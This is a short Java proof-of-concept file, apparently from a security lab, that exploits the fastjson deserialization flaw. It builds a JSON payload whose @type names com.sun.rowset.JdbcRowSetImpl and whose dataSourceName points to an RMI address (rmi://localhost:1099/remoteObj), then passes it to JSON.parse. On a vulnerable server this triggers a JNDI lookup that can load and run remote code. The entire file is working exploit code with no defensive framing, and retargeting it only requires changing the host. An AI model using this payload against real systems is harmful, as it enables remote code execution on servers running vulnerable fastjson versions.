import com.alibaba.fastjson.JSON;

// 基于 JdbcRowSetImpl 的利用链
public class JdbcRowSetImplRmiExp {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
